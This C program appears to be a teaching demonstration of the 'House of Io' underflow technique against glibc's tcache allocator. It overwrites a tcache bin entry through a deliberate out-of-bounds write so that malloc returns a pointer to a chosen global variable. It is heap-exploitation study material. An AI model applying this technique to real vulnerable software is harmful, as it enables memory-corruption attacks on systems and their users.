#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// House of Io - Underflow Variant
// ===============================
//
// Source: https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/
//
// Tested on libc versions 2.31, 2.32 and 2.33.
//
// House of Io makes use of the fact, that when freeing a chunk into the tcache
// the chunk will receive a pointer to the tcache management struct which has
// been allocated beforehand. This pointer is the tcache->key entry of a free'd
// tcache chunk. There are three different versions of this attack and all work
// even with safe-link enabled, as the tcache-key pointer, and more importantly
// the pointers in the tcache_perthread_struct, are not protected.

unsigned long global_var = 1;

struct tcache_perthread_struct {
  uint16_t counts[64];
  uint64_t entries[64];
};

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  puts("In house of Io we make use of the fact, that a free'd tcache chunk\n"
       "gets a pointer to the tcache management struct inserted at the\n"
       "second slot.\n");

  puts(
      "This variant only works if we can underflow an access on a heap chunk,\n"
      "to get access to the management struct on the heap. We then overwrite\n"
      "a pointer in a tcache bin to point to our target.\n");

  printf("Specifically we get a pointer to the `global_var` at %p returned to\n"
         "us from malloc.\n\n",
         &global_var);

  puts(
      "First we allocate a chunk on the heap. We will underflow an access to\n"
      "this chunk. In this example the victim chunk comes directly after the\n"
      "tcache management struct, but in theory it can be everywhere on the\n"
      "heap, as the first allocation will always be the management chunk, and\n"
      "we assume an arbitrary underflow.\n");
  uint64_t *victim_chunk = malloc(0x10);

  puts("We then put a chunk into its tcache bin. We choose a large chunk, as\n"
       "their bins come later in the array and thus are closer to our victim\n"
       "chunk.\n");
  uint64_t *free_chunk = malloc(0x390);
  free(free_chunk);

  puts("Then we underflow the victim chunk to exactly where the bin to our\n"
       "free'd chunk is and write our target address there.\n");
  *(victim_chunk - 10) = (uint64_t)&global_var;

  puts("If we now allocate the same size of the free'd chunk again, we get a\n"
       "chunk located at our target.\n");
  uint64_t *evil_chunk = malloc(0x390);

  assert(evil_chunk == &global_var);
  return 0;
}
